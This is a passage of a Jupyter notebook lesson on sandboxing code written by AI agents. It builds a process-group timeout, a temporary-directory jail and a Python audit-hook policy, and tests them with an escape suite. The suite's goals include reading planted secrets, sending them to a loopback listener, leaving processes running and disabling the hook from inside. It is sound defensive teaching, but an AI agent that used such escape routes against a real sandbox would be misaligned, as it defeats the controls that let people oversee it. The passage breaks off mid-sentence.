<!-- COMMONS LAUNCHER v4 · generated by tools/notebooks.py · do not edit by hand -->
<a href="https://github.com/TarrySingh/Artificial-Intelligence-Deep-Learning-Machine-Learning-Tutorials"><img src="https://raw.githubusercontent.com/TarrySingh/Artificial-Intelligence-Deep-Learning-Machine-Learning-Tutorials/master/brand/synapsa-commons-badge.png" alt="Synapsa Commons" height="36"></a>

Free, hands-on AI courses that run anywhere, from the team building [Synapsa](https://synapsa.realai.eu), an AI-native
learning platform.

© 2026 RealAI · free to learn from, share and adapt, not to sell ([CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/)).
The notice at the end of this notebook says what you may and may not do.

[![Open in Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/TarrySingh/Artificial-Intelligence-Deep-Learning-Machine-Learning-Tutorials/blob/master/lessons/T07-L07-build-a-sandbox-you-would-trust/lesson.ipynb)
[![Open in Kaggle](https://kaggle.com/static/images/open-in-kaggle.svg)](https://kaggle.com/kernels/welcome?src=https://github.com/TarrySingh/Artificial-Intelligence-Deep-Learning-Machine-Learning-Tutorials/blob/master/lessons/T07-L07-build-a-sandbox-you-would-trust/lesson.ipynb)
[![Open in Binder](https://mybinder.org/badge_logo.svg)](https://mybinder.org/v2/gh/TarrySingh/Artificial-Intelligence-Deep-Learning-Machine-Learning-Tutorials/master?labpath=lessons/T07-L07-build-a-sandbox-you-would-trust/lesson.ipynb)
[![Open in Codespaces](https://github.com/codespaces/badge.svg)](https://codespaces.new/TarrySingh/Artificial-Intelligence-Deep-Learning-Machine-Learning-Tutorials)

This lesson needs Python 3.11 or newer.

In [ ]:
# --- COMMONS LAUNCHER v4 · generated by tools/notebooks.py · do not edit by hand ---
# Makes this notebook run anywhere. Every line is a no-op when the thing is already present,
# so a local clone pays nothing and an online notebook repairs itself.
import importlib.util, os, subprocess, sys, urllib.request
from pathlib import Path

COMMONS_PIP = []            # (import name, pinned pip spec) for what this lesson imports
COMMONS_SIBLINGS = []    # files that must sit beside the notebook
# A fork, a classroom mirror or an offline copy can serve the files from elsewhere by setting
# COMMONS_RAW_OVERRIDE before running this cell.
COMMONS_RAW = os.environ.get("COMMONS_RAW_OVERRIDE") or "https://raw.githubusercontent.com/TarrySingh/Artificial-Intelligence-Deep-Learning-Machine-Learning-Tutorials/master/lessons/T07-L07-build-a-sandbox-you-would-trust/"

# Resolve siblings against the LESSON's own directory, not the working directory. A notebook
# has no __file__ and runs with cwd alongside itself; a grader imports this file from the repo
# root. Checking cwd blindly makes the grader think every sibling is missing and reach for the
# network -- which would put a download on a graded path.
try:
    COMMONS_DIR = Path(__file__).resolve().parent
except NameError:
    COMMONS_DIR = Path.cwd()


def commons_host() -> str:
    """Name the notebook service we are on. Used for the message, and for honest errors."""
    try:
        if importlib.util.find_spec("google.colab") is not None:
            return "Google Colab"
    except (ImportError, ValueError):
        pass
    if os.environ.get("KAGGLE_KERNEL_RUN_TYPE"):
        return "Kaggle"
    if os.environ.get("BINDER_SERVICE_HOST"):
        return "Binder"
    if os.environ.get("CODESPACES"):
        return "GitHub Codespaces"
    return "a local Python environment"


_missing = [pip for imp, pip in COMMONS_PIP if importlib.util.find_spec(imp) is None]
if _missing:
    print("installing " + ", ".join(_missing) + " ...")
    # pip everywhere a student is likely to be; uv-managed local venvs ship without pip.
    if importlib.util.find_spec("pip") is not None:
        subprocess.run([sys.executable, "-m", "pip", "install", "-q", *_missing], check=True)
    else:
        subprocess.run(["uv", "pip", "install", "-q", "--python", sys.executable, *_missing],
                       check=True)
    importlib.invalidate_caches()

_fetched = []
for _name in COMMONS_SIBLINGS:
    if not (COMMONS_DIR / _name).exists():
        (COMMONS_DIR / _name).parent.mkdir(parents=True, exist_ok=True)
        try:
            urllib.request.urlretrieve(COMMONS_RAW + _name, COMMONS_DIR / _name)
            _fetched.append(_name)
        except Exception as _e:  # Kaggle disables the internet by default; say so plainly
            raise RuntimeError(
                f"this lesson needs {_name} beside the notebook and could not fetch it "
                f"({_e}). On Kaggle, switch Internet on in the notebook settings panel "
                f"(Kaggle allows that only for phone-verified accounts); otherwise download it "
                f"from {COMMONS_RAW + _name} and upload it beside the notebook."
            ) from None

print("ready on " + commons_host() + ("; fetched " + ", ".join(_fetched) if _fetched else ""))
# --- END COMMONS LAUNCHER ---

# T07-L07 · Build a sandbox you would trust: an import audit, timeouts and a filesystem jail, each checked by an escape suite

**You will build:** the three layers that make running generated Python less reckless — a
supervisor that stops a child process and everything still in its process group, a path check
for a temporary-directory jail, and a policy for Python's audit hook — and the escape suite that
tells you what each layer stops, alone and in combination, and what gets through all three.

**Time:** ~60 minutes · **Runs on:** a laptop CPU on macOS or Linux (the notebook services above
are Linux), no GPU, no download · **Prerequisites:** T07-L01-agent-loop-from-scratch (the loop
whose tool calls this lesson puts three layers of control around).

Nothing here is a product. The point is the measurement: twenty-one seeded attempts to get out, each
run against an undefended child first, so that "stopped" means something, and then against every
combination of the layers. A teaching sandbox is not a security boundary, and the last section
says so with the evidence you have just produced.

By the end you will be able to:

1. Implement a supervisor that runs a child process under a wall-clock timeout and kills its
   whole process group, and measure what that stops and the one thing it cannot reach: a
   process that has left the group.
2. Implement a jail check that decides whether a path is inside a directory after resolving
   symlinks and `..`, and show the paths a string-prefix check lets out.
3. Implement a policy for Python's audit hook that allows only the events a benign workload was
   observed to raise, judges imports by package, and checks the paths of file events.
4. Measure what twenty-one seeded escape attempts reach against each of the eight combinations
   of the three layers, using an undefended run as the control.
5. Compute each layer's coverage alone and its leave-one-out value, and name the attempts that
   get through all three.

<!-- COMMONS BEFORE v1 · generated from meta.yaml by tools/notebooks.py · do not edit by hand -->
## Before you start

**Lessons to do first:** `T07-L01`

**This lesson assumes you can already:**

- write Python functions with docstrings, try/except and with-statements, and read a traceback
- start a command with subprocess.run or subprocess.Popen and read its output and exit code
- tell an absolute path from a relative one, and say what .. and a symbolic link do

**New to some of that? These are good places to learn it** (free to read online first, then paid books). You do not need any of them if the list above already reads as familiar.

- [sys.addaudithook() and the audit events table](https://docs.python.org/3/library/sys.html#sys.addaudithook) · The Python Software Foundation (Python documentation) · *free* — what an audited event is and how a hook can refuse an operation, with the documentation's own warning that hooks are not a sandbox
- [PEP 578: Python Runtime Audit Hooks](https://peps.python.org/pep-0578/) · Steve Dower (Python Enhancement Proposals) · *free* — the design behind the audit events this lesson's policy judges, including its section on why hooks are not a sandbox
- [subprocess: Subprocess management](https://docs.python.org/3/library/subprocess.html) · The Python Software Foundation (Python documentation) · *free* — Popen, communicate() with a timeout (which does not kill anything) and start_new_session, which exercise 1's supervisor depends on
- [killpg(3), Linux manual page](https://man7.org/linux/man-pages/man3/killpg.3.html) · The Linux man-pages project · *free* — how one signal reaches every process in a process group, and what a group id of 0 means (your own group)
- [The Linux Programming Interface](https://man7.org/tlpi/) · Michael Kerrisk (No Starch Press, 2010) · *paid* — chapter 34 on process groups, sessions and job control is the background to layer T; the book's page lists the contents

In [ ]:
# Setup: everything the lesson needs, in one cell, with versions printed.
import atexit
import base64
import contextlib
import hashlib
import io
import itertools
import json
import marshal
import os
import pathlib
import re
import select
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import textwrap
import threading
import time
import traceback
from pathlib import Path
from typing import Callable, Mapping, NamedTuple

print("python", sys.version.split()[0], "· platform", sys.platform)
assert os.name == "posix", (
    "this lesson uses process groups and sessions, which exist on macOS and Linux; on Windows use "
    "WSL, or open the notebook with one of the badges above"
)

SEED = 20261014          # this lesson's one seed: every planted secret, file name and variable name
                          # derives from it, so re-running prints the same results anywhere.
LAYERS = ("audit", "timeout", "jail")
LETTER = {"audit": "A", "timeout": "T", "jail": "J"}
TIMEOUT_S = 0.8          # the wall-clock limit when the timeout layer is on
BACKSTOP_S = 1.2         # the harness's own emergency stop when it is off, so that a loop that
                          # never ends cannot make this lesson never end
GRACE_S = 2.0            # after your supervisor has stopped a child, how long it may wait for the rest of its output
DEADMAN_S = 25           # every child ends itself after this long even if nobody comes for it
FILL_BYTES = 4 << 20     # what the "fill the disk" attempt writes
FILL_COUNTS = 1 << 20    # ... and how much of it has to be there for the attempt to count
# Modules the child imports BEFORE the audit hook goes in. An import of a module that is already
# loaded raises no audit event, so everything a benign program needs is loaded up front.
PRELOAD = ("json", "math", "re", "collections", "itertools", "functools", "statistics", "random",
           "string", "textwrap", "datetime", "time", "pathlib")
# A module a benign program writes into its own folder and then imports: the one import the policy's
# package rule has to let through.
OWN_MODULES = ("helper",)

_FAILED_CHECKS: list[str] = []
_STATUS: dict[str, str] = {}   # label -> "passed" | "failed" | "not started", latest run
_DEMOS = __name__ == "__main__"  # the long measurements run in the notebook or as a script, not when
                                  # a grader imports this file to call your functions

# The exercises, in the order you meet them, and the functions each one asks you to write.
# The progress board at the foot of the notebook is built from this, and a cell that is
# waiting on an unfinished exercise names it from here.
_EXERCISES: dict[str, tuple[str, ...]] = {
    "exercise 1": ("supervise",),
    "exercise 2": ("inside_jail",),
    "exercise 3": ("event_verdict",),
    "exercise 4": ("stopped_by",),
    "exercise 5": ("critical_layers",),
}


def _named(labels: list[str]) -> str:
    """["exercise 3"] -> "exercise 3 (event_verdict)"; several -> "exercises 2, 3 and 4"."""
    if len(labels) == 1:
        return f"{labels[0]} ({', '.join(_EXERCISES[labels[0]])})"
    nums = [label.split()[-1] for label in labels]
    return "exercises " + ", ".join(nums[:-1]) + " and " + nums[-1]


# A check that never returns would freeze the notebook (and the grader, which imports it). Every
# check below runs under a time limit far above what a correct answer needs, and a whole demo
# gets a much longer one, because the measurements in this lesson start real processes.
_CHECK_SECONDS = 2      # an exercise's check, unless the next line says otherwise
_CHECK_SECONDS_BY_LABEL = {"exercise 1": 30,   # supervise() starts real processes and waits out the harness's backstop: 10.1 s
                           "exercise 3": 5}    # measured, nearly all of it deliberate waiting; exercise 3 starts processes too (0.34 s)
_DEMO_SECONDS = 240


class _OutOfTime(BaseException):
    """Raised inside a guarded block when its time is up. A BaseException, so an `except
    Exception:` in the code under test cannot swallow it, and it repeats every 0.25 s in case a
    bare `except:` does. The guard turns it into an AssertionError once it has left that code."""


def _resident() -> float:
    """This process's resident memory now, in MiB (Linux: /proc; macOS: libproc); its peak so far elsewhere."""
    try:
        if sys.platform.startswith("linux"):
            with open("/proc/self/statm") as f:
                return int(f.read().split()[1]) * os.sysconf("SC_PAGE_SIZE") / 2**20
        if sys.platform == "darwin":
            import ctypes, struct
            info = ctypes.create_string_buffer(96)           # struct proc_taskinfo
            if ctypes.CDLL("/usr/lib/libproc.dylib").proc_pidinfo(os.getpid(), 4, 0, info, 96) == 96:
                return struct.unpack_from("QQ", info.raw)[1] / 2**20     # pti_resident_size
    except Exception:
        pass
    import resource
    return resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / (2**20 if sys.platform == "darwin" else 2**10)


@contextlib.contextmanager
def _time_limit(seconds: float, what: str, memory_mib: float = 2048):
    """Turn a call that never returns into a failed check that says so, instead of a notebook
    that hangs. It uses the operating system's alarm where there is one (Linux and macOS, in the
    main thread) and does nothing elsewhere. An alarm that whoever started us had already set
    keeps its own deadline if it is due first, and is put back, with the time it had left and
    its repeat interval, when the block ends. A correct answer finishes far inside the limit,
    and nothing that is printed depends on it."""
    if not (all(hasattr(signal, name) for name in ("setitimer", "SIGALRM", "pthread_sigmask", "sigpending", "sigwait"))
            and threading.current_thread() is threading.main_thread()):
        yield
        return
    if getattr(_time_limit, "stopped", False):           # a stopped block's frames keep what they built in a
        _time_limit.stopped = False                      # reference cycle until now: free it, so it is not counted
        import gc
        gc.collect()                                     # as the growth of this block
    message = (f"{what} was still running after {seconds:g} s: a loop whose "
               "stopping condition is never met (a counter that is never "
               "advanced, an index that wraps round, a tolerance that is never "
               "reached exactly) runs for ever; give every loop a cap")
    started = time.monotonic()
    used_mib = None
    if memory_mib:
        used_mib = _resident
        base_mib = used_mib()                            # resident memory now; only growth beyond it counts
    previous = signal.getsignal(signal.SIGALRM)
    outer_left, outer_every = signal.getitimer(signal.ITIMER_REAL)   # an alarm already running
    # One alarm at a time, never a repeating one. next: when ours is due; outer: when the alarm we
    # found is due (every: its interval); unseen: an alarm is armed and has not reached _fire yet.
    state = {"next": started + seconds, "outer": started + outer_left if outer_left > 0 else None,
             "every": outer_every, "unseen": False, "fired": False, "done": False, "message": message, "count": 0, "budget": 0,
             "traced": False, "tracer": None, "tool": None, "at": None, "thread": threading.get_ident(),
             "me": sys._getframe(), "owner": None}
    owner = state["me"].f_back
    while owner is not None and owner.f_globals is vars(contextlib):    # contextlib's __enter__
        owner = owner.f_back
    state["owner"], state["at"] = owner, owner.f_lineno   # the frame running the `with`, and its line

    def _arm(now, soonest=0.001):                        # one shot, at whichever deadline is next
        due = [t for t in (state["next"], state["outer"]) if t is not None]
        if used_mib and state["next"] is not None and not state["fired"]:
            due.append(now + 0.1)                        # and look at the memory every 0.1 s
        if due:
            signal.setitimer(signal.ITIMER_REAL, max(min(due) - now, soonest))
            state["unseen"] = True

    def _in_guard(frame):                                # is the alarm landing in a guard's own set-up, exit
        while frame is not None and frame is not state["owner"]:     # or clean-up (this one's or another's:
            code = frame.f_code                          # guards nest), or in contextlib's __exit__ under
            if (frame is state["me"] or code in _own_code or code.co_name in _GUARDS   # a `with`?
                    or frame.f_globals.get("__name__") == "contextlib"):
                return True
            frame = frame.f_back
        return False

    def _fire(signum, frame):
        state["unseen"] = False
        if state["done"]:
            return                                       # a late alarm of ours: already handled
        if _in_guard(frame):                             # never raise inside the guard: it is
            _arm(time.monotonic(), 0.01)                 # finishing; look again shortly
            return
        now = time.monotonic()
        if state["outer"] is not None and now >= state["outer"] - 0.005:
            every = state["every"]                       # the outer alarm is due: act as it would
            state["outer"] = state["outer"] + every * (1 + (now - state["outer"]) // every) if every else None
            try:
                if callable(previous):
                    previous(signum, frame)
                elif previous != signal.SIG_IGN:         # its default action ends the process
                    signal.signal(signal.SIGALRM, signal.SIG_DFL)
                    os.kill(os.getpid(), signal.SIGALRM)
            except BaseException:
                state["next"] = None                     # the outer one is stopping the block
                raise
            finally:
                left, every = signal.getitimer(signal.ITIMER_REAL)
                if left > 0:                             # the outer handler armed its next alarm
                    state["outer"], state["every"] = time.monotonic() + left, every
                _arm(time.monotonic())
            now = time.monotonic()
        grown = used_mib() - base_mib if used_mib and not state["fired"] else 0
        if grown > memory_mib and state["next"] is not None:       # out of memory before out of time
            state["message"] = (f"{what} was using over {memory_mib:g} MiB more memory than when it started, "
                                f"after {now - started:.1f} s: a loop that keeps adding to a list or a string "
                                "never stops; give every loop a cap")
            state["next"] = now
        if state["next"] is not None and now >= state["next"] - 0.005:
            swallowed = state["fired"]                   # a second stop: the first did not end the block
            state["fired"] = True
            state["count"] += 1
            state["next"] = now + 0.25                   # again, in case a bare `except:` swallows it
            _arm(now)
            if swallowed:
                state["budget"] = state["count"] - 1     # the tracer raises this many times, then leaves clean-up alone
                _trace_from(frame)
            raise _OutOfTime(state["message"], state)
        _arm(now)

    def _trace(frame, event, arg):                       # raises the stop at the next line of code that
        if state["done"] or _in_guard(frame):            # runs: inside the handler that swallowed the last
            return None                                  # (the interpreter then unsets it; the next alarm
        if event == "line":                              # sets it again)
            raise _OutOfTime(state["message"], state)
        return _trace

    def _line(code, line):                               # Python 3.12+: sys.monitoring, which is not unset
        if state["done"] or state["budget"] <= 0 or threading.get_ident() != state["thread"]:   # not unset when a
            return                                       # callback raises: the next line the code runs raises too, handlers
        frame = sys._getframe(1)                         # included (this thread only), but only `budget` times:
        if _in_guard(frame) or (frame is state["owner"] and line == state["at"]):   # clean-up that runs once the stop has
            return                                       # left the swallowing loops must not be interrupted again
        state["budget"] -= 1                             # (not the `with` line: its exit runs the guard)
        raise _OutOfTime(state["message"], state)

    def _trace_from(frame):                              # trace the running frames, and the ones called next
        if not state["traced"]:
            state["traced"] = True
            mon = getattr(sys, "monitoring", None)
            for tool in (5, 4, 3, 2, 1, 0) if mon is not None else ():
                try:
                    mon.use_tool_id(tool, "commons-time-limit")
                except ValueError:                       # a debugger or a profiler has this one
                    continue
                state["tool"] = tool
                mon.register_callback(tool, mon.events.LINE, _line)
                mon.set_events(tool, mon.events.LINE)
                return
            state["tracer"] = sys.gettrace()
            sys.settrace(_trace)
        while frame is not None and frame is not state["owner"]:
            frame.f_trace = _trace
            frame = frame.f_back

    _GUARDS = ("_time_limit", "_deadline", "_resident", "_time_limit", "_fire", "_arm", "_trace", "_trace_from", "_line", "_in_guard")
    _own_code = (_fire.__code__, _arm.__code__, _trace.__code__, _trace_from.__code__, _line.__code__)

    signal.signal(signal.SIGALRM, _fire)
    _arm(time.monotonic())
    try:
        try:
            yield
        finally:
            state["done"] = True                         # from here on an alarm of ours only counts
            if state["traced"]:
                state["traced"] = False
                if state["tool"] is not None:
                    sys.monitoring.set_events(state["tool"], 0)
                    sys.monitoring.register_callback(state["tool"], sys.monitoring.events.LINE, None)
                    sys.monitoring.free_tool_id(state["tool"])
                else:
                    sys.settrace(state["tracer"])        # the tracer that was there before, if any
            mask = signal.pthread_sigmask(signal.SIG_BLOCK, {signal.SIGALRM})
            try:
                if signal.setitimer(signal.ITIMER_REAL, 0)[0] == 0 and state["unseen"]:
                    # Ours went off and has not reached _fire: it is pending here, or on its way to
                    # another thread. Take it before the old handler (by default, one that ends the
                    # process) is back.
                    give_up = time.monotonic() + 0.5
                    while state["unseen"] and time.monotonic() < give_up:
                        if signal.SIGALRM in signal.sigpending():
                            signal.sigwait({signal.SIGALRM})
                            state["unseen"] = False
                        else:
                            time.sleep(0.001)            # another thread has it: _fire runs next
                signal.signal(signal.SIGALRM, signal.SIG_DFL if previous is None else previous)
                outer = state["outer"]                   # re-arm the alarm we found, last
                signal.setitimer(signal.ITIMER_REAL, *((max(outer - time.monotonic(), 0.001), state["every"])
                                                       if outer is not None else (0, 0)))
            finally:
                signal.pthread_sigmask(signal.SIG_SETMASK, mask)
                state["me"] = state["owner"] = None
    except _OutOfTime as exc:
        if exc.args[-1] is not state:                    # an enclosing guard's: not ours to report
            raise
        _time_limit.stopped = True
        raise AssertionError(state["message"]) from None
    if state["fired"]:                                   # the block caught our alarm and carried on
        _time_limit.stopped = True
        raise AssertionError(state["message"])


def _try(label: str, check: Callable[[], None], needs: tuple[str, ...] = ()) -> None:
    """Run a check, or a demo that depends on your code, without derailing the notebook.

    A stub you have not filled in yet simply says so. A wrong answer prints the check's own
    message, which names the likely mistake, and the notebook carries on, so one broken
    exercise never hides the feedback on the others. A demo names the exercises it `needs`:
    until each has passed its check, the demo says which one it is waiting for and skips.
    Nothing is swallowed: every outcome is recorded in `_STATUS` for the progress board at the
    foot of the notebook, and every failure in `_FAILED_CHECKS`, which ends a script run
    non-zero.
    """
    waiting = [name for name in _EXERCISES
               if name in needs and _STATUS.get(name) != "passed"]
    if waiting:
        _STATUS[label] = "not started"
        print(f"{label}: skipped — needs {_named(waiting)} to pass first.")
        return
    try:
        with _time_limit(_CHECK_SECONDS_BY_LABEL.get(label, _CHECK_SECONDS) if label in _EXERCISES else _DEMO_SECONDS, label):
            check()
    except NotImplementedError as exc:
        _STATUS[label] = "not started"
        stub = traceback.extract_tb(exc.__traceback__)[-1].name
        owner = [name for name, funcs in _EXERCISES.items() if stub in funcs and name != label]
        if owner:
            print(f"{label}: skipped — needs {_named(owner)} first.")
        elif label in _EXERCISES:
            print(f"{label}: not implemented yet — fill in {stub}() above, then re-run "
                  "this cell.")
        else:
            print(f"{label}: skipped — {stub}() is not implemented yet.")
    except AssertionError as exc:
        _STATUS[label] = "failed"
        _FAILED_CHECKS.append(label)
        print(f"{label}: FAILED — {exc}")
    except Exception as exc:
        _STATUS[label] = "failed"
        _FAILED_CHECKS.append(label)
        print(f"{label}: raised {type(exc).__name__}: {exc}")
    else:
        _STATUS[label] = "passed"

## 1. What is at stake, and what this lesson is not

An agent that writes code needs somewhere to run it. The code can be wrong, careless, or steered
by text the agent read on a page it was sent to (an indirect prompt injection). Four things are
at stake when it runs:

* **files and secrets** outside the folder it was given, to read or to overwrite;
* **the network**, which is how a secret leaves the machine;
* **the machine's time**, because a loop that never ends is an outage;
* **the process table**, because something it started can keep running after you stopped it.

You will build one layer for each of three controls, and then measure them:

* **audit (A)**: the child process installs a hook that Python calls for every *audited event*
  (opening a file, starting a process, importing a module). Your policy says yes or no.
* **timeout (T)**: a supervisor waits for the child under a wall-clock limit and, when the limit
  passes, stops the child *and everything that is still in its process group*.
* **jail (J)**: the child works in a fresh temporary folder, with an empty environment, and the
  policy refuses file events whose path leads out of it.

What this is not: as of 15 October 2026 Python's own documentation says audit hooks are not
suitable for implementing a sandbox. The reason is one you will measure: a hook that lives inside the process it guards is only
as strong as that process. The operating system or a hypervisor makes a real boundary (a
container, a microVM). This lesson builds the layers you would still want inside one, and the
escape suite that tells you what each of them is worth. The sources are in `claims.yaml`;
section 9 comes back to them.

First, the arena. Every run gets a new one, with canaries planted in it: a fake secret in a file
beside the jail, a fake secret in the environment, and a path that must stay empty. Whether an
attempt succeeded is decided by whether a canary turned up where it should not, never by what the
attempt printed about itself. Nothing here goes near your own files: every attempt aims at canaries
inside a temporary folder that is deleted afterwards, and the only network address any attempt
tries is a listener this notebook opens on your machine's loopback.

In [ ]:
class Run(NamedTuple):
    """What a supervisor reports about one child process."""
    status: str            # "exited", or "timeout" when the supervisor had to stop the child
    stdout: str
    stderr: str
    returncode: int | None


def _digest(tag: int, label: str, n: int = 12) -> str:
    """A short hex string that depends only on SEED, the run's tag and a label: planted names and
    secrets are the same on every machine and in every run."""
    return hashlib.sha256(f"{SEED}:{tag}:{label}".encode()).hexdigest()[:n]


def _remove_tree(path: str) -> None:
    """Delete a folder tree even when a helper that outlived its run writes into it while it goes: a file
    created between the removal of the contents and of the folder would leave the folder behind."""
    for _ in range(5):
        shutil.rmtree(path, ignore_errors=True)
        if not os.path.exists(path):
            return
        time.sleep(0.05)


class World:
    """One fresh arena for one run.

        base/                     the host: nothing in here is the child's business
          secret-<hex>.txt        a file holding a planted fake secret (the token)
          jail-sibling/notes.txt  a folder whose name starts with the jail's name, holding the token
          jail/                   the child's working folder; empty at the start
          out-<hex>.txt           must never exist; an attempt that makes it has written outside the jail
          heart-<hex>.txt         where a process the run started leaves a sign that it is still alive
    """

    def __init__(self, tag: int):
        self.tag = tag
        self.base = tempfile.mkdtemp(prefix="sandbox-lesson-")
        self.jail = os.path.join(self.base, "jail")
        os.mkdir(self.jail)
        self.token = "canary-" + _digest(tag, "token")
        self.secret_name = "secret-" + _digest(tag, "file") + ".txt"
        self.secret = os.path.join(self.base, self.secret_name)
        with open(self.secret, "w") as f:
            f.write(self.token)
        self.sibling = os.path.join(self.base, "jail-sibling")
        os.mkdir(self.sibling)
        self.sibling_file = os.path.join(self.sibling, "notes.txt")
        with open(self.sibling_file, "w") as f:
            f.write(self.token)
        self.out = os.path.join(self.base, "out-" + _digest(tag, "out") + ".txt")
        self.heart = os.path.join(self.base, "heart-" + _digest(tag, "heart") + ".txt")
        self.env_name = "DEMO_SECRET_" + _digest(tag, "env").upper()
        self.listener = None
        self.port = 0

    def fill(self, source: str) -> str:
        """Put this arena's paths and canaries into an attempt's source text."""
        for key, value in (("@SECRET@", self.secret), ("@SECRETNAME@", self.secret_name),
                           ("@BASE@", self.base), ("@SIBLING@", self.sibling_file),
                           ("@OUT@", self.out), ("@TOKEN@", self.token), ("@HEART@", self.heart),
                           ("@ENV@", self.env_name), ("@PORT@", str(self.port)),
                           ("@FILL@", str(FILL_BYTES))):
            source = source.replace(key, value)
        return source

    def listen(self) -> None:
        """Open a listening socket on this machine's loopback, for the attempt that tries to connect out."""
        self.listener = socket.socket()
        self.listener.bind(("127.0.0.1", 0))
        self.listener.listen(1)
        self.port = self.listener.getsockname()[1]

    def received(self) -> bytes:
        """Whatever a program connected to the listener and sent (empty if nothing did)."""
        if self.listener is None:
            return b""
        self.listener.settimeout(0.3)
        try:
            conn, _ = self.listener.accept()
            conn.settimeout(0.3)
            return conn.recv(100)
        except OSError:
            return b""

    def jail_bytes(self) -> int:
        return sum(os.path.getsize(os.path.join(self.jail, name)) for name in os.listdir(self.jail))

    def close(self) -> None:
        if self.listener is not None:
            self.listener.close()
        _remove_tree(self.base)

### The child process

Untrusted code never runs in your notebook. Each run starts a **new interpreter** (`python -I -S`:
isolated, no site packages) in a **new session**, which makes the child the leader of a process
group of its own whose id is the child's pid. That one fact is the whole of layer T, and also its
limit: whatever the child starts stays in the group until it leaves it, and section 3 shows how a
process leaves.

The job (source text, policy, your functions) arrives on the child's standard input. The child
loads the modules benign programs need, installs the hook, tells the supervisor it is ready, and
only then compiles and runs the generated code. Read the bootstrap below: it is short, and every
line explains a result you will meet later. Nothing in it is yours to change.

Two details to carry forward. Your two policy functions are shipped to the child as *code
objects*, so each must be self-contained: it may use `os`, `sys`, `re`, `pathlib` and `Path`
(which is `pathlib.Path`), plus the other shipped function, and nothing else defined in the
notebook. And the hook is a Python function in the very process it watches.

In [ ]:
BOOTSTRAP_BODY = r'''
import sys, os, json, marshal, types, base64, signal
job = json.loads(sys.stdin.read())           # the whole job arrives on standard input
signal.alarm(job["deadman"])                  # the harness's safety net; not one of the layers
for name in job["preload"]:                   # load what benign programs need BEFORE the hook goes in
    __import__(name)
policy = job["policy"]
if job["record"]:                             # learning mode: only write down which events were raised
    seen = set()
    def hook(event, args):
        if event not in seen:
            seen.add(event)
            os.write(2, b"\0EVT " + event.encode() + b"\n")
    sys.addaudithook(hook)
elif policy is not None:                      # enforcing mode: ask the policy about every event
    ns = {"os": os, "sys": sys, "re": sys.modules["re"], "pathlib": sys.modules["pathlib"],
          "Path": sys.modules["pathlib"].Path}
    for name, blob in job["functions"].items():        # your functions, shipped as code objects
        ns[name] = types.FunctionType(marshal.loads(base64.b64decode(blob)), ns, name)
    verdict = ns["event_verdict"]
    def hook(event, args):
        try:
            reason = verdict(event, args, policy)
        except Exception as exc:                       # a policy that crashes must fail closed
            reason = "the policy raised " + type(exc).__name__ + ": " + str(exc)
        if reason is not None:
            raise PermissionError("sandbox: " + reason)
    sys.addaudithook(hook)
os.write(job["ready_fd"], b"R")               # tell the supervisor we are ready, then run the code
os.close(job["ready_fd"])
exec(compile(job["source"], "<generated>", "exec"), {"__name__": "__main__"})
'''


def bootstrap_text(hardened: bool = False) -> str:
    """The bootstrap as the child receives it. `hardened` wraps the very same lines in a function,
    so that their names live in a function's scope instead of in the module the child runs as
    `__main__`. Section 7 shows why anyone would."""
    if not hardened:
        return BOOTSTRAP_BODY
    return "def main():\n" + textwrap.indent(BOOTSTRAP_BODY, "    ") + "\nmain()\n"


_LIVE: dict[int, subprocess.Popen] = {}     # every child started here that has not been cleaned up


def _kill_group(pid: int) -> None:
    try:
        os.killpg(pid, signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        pass                                 # nothing of it is left


def reap_all() -> None:
    """The harness's own clean-up, not a layer: stop every group this lesson started, so that no
    attempt, whatever it did and whatever your supervisor forgot, outlives the measurement."""
    for pid, proc in list(_LIVE.items()):
        _kill_group(pid)
        try:
            proc.wait(timeout=5)
        except Exception:
            pass
        for stream in (proc.stdout, proc.stderr):
            if stream is not None:
                with contextlib.suppress(Exception):
                    stream.close()
        _LIVE.pop(pid, None)


atexit.register(reap_all)


def launch(source: str, policy: dict | None, cwd: str, env: dict, *, functions: dict | None = None,
           record: bool = False, hardened: bool = False) -> subprocess.Popen:
    """Start the bootstrap in a new session, hand it the job, and return once it says it is ready.

    The child's pid is also its process group's id. Its standard output and error are pipes for a
    supervisor to read; its standard input is spent on the job and closed.
    """
    ready_r, ready_w = os.pipe()
    job = {"source": source, "policy": policy, "preload": list(PRELOAD), "deadman": DEADMAN_S,
           "functions": {name: base64.b64encode(marshal.dumps(fn.__code__)).decode()
                         for name, fn in (functions or {}).items()},
           "record": record, "ready_fd": ready_w}
    proc = subprocess.Popen([sys.executable, "-I", "-S", "-c", bootstrap_text(hardened)],
                            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            cwd=cwd, env=env, pass_fds=(ready_w,), start_new_session=True)
    os.close(ready_w)
    _LIVE[proc.pid] = proc
    try:
        proc.stdin.write(json.dumps(job).encode())
        proc.stdin.close()
    except BrokenPipeError:
        pass                                 # the bootstrap died early; its error is on stderr
    proc.stdin = None                        # closed: keeps Popen.communicate() from touching it
    if select.select([ready_r], [], [], 30)[0]:
        os.read(ready_r, 1)
    os.close(ready_r)
    return proc


def supervise_naive(proc: subprocess.Popen, timeout_s: float) -> Run:
    """The supervisor most people write first: wait, and if it takes too long, kill the child."""
    try:
        out, err = proc.communicate(timeout=timeout_s)
        status = "exited"
    except subprocess.TimeoutExpired:
        proc.kill()
        out, err = proc.communicate()
        status = "timeout"
    return Run(status, out.decode("utf-8", "replace"), err.decode("utf-8", "replace"), proc.returncode)

In [ ]:
# The undefended child: no hook, no timeout, no jail. Run it once and look at what it says.
if _DEMOS:
    arena = World(0)
    child = launch("print('the child says', 6 * 7)", None, arena.jail, {})
    first = supervise_naive(child, BACKSTOP_S)
    reap_all()
    arena.close()
    print("status:", first.status, "· exit code:", first.returncode, "· output:", repr(first.stdout))

## 2. Twenty-one ways out, and the programs you must not break

The escape suite is twenty-one short programs, each with a **goal** that is checked by a canary:

* *files*: read a planted secret, write outside the jail, learn what is outside;
* *processes*: start a program the hook cannot see, or leave one running after the run (in the
  run's process group, or in a session of its own);
* *network*: send the secret to a listener on this machine's loopback;
* *secrets*: read the secret planted in the child's environment;
* *the hook*: switch the policy off from inside;
* *resources*: never stop, or fill the disk.

Beside them sits a **benign suite**: seven small programs of the kind a data-analysis agent
writes (statistics, text counting, a seeded simulation, file work in its own folder, a helper
module it writes and imports). A sandbox
